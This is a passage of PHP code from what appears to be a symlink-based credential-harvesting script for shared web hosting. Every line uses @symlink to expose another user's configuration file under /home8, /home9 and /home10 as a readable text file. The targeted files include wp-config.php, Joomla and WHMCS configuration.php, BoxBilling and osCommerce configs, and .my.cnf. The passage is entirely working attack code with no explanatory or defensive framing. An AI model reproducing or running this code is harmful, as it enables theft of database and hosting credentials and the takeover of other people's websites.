    @symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home8/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    
    //home 9 
    
    @symlink('/home9/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home9/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home9/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home9/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    
    //home 10
    
    @symlink('/home10/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home10/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home10/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
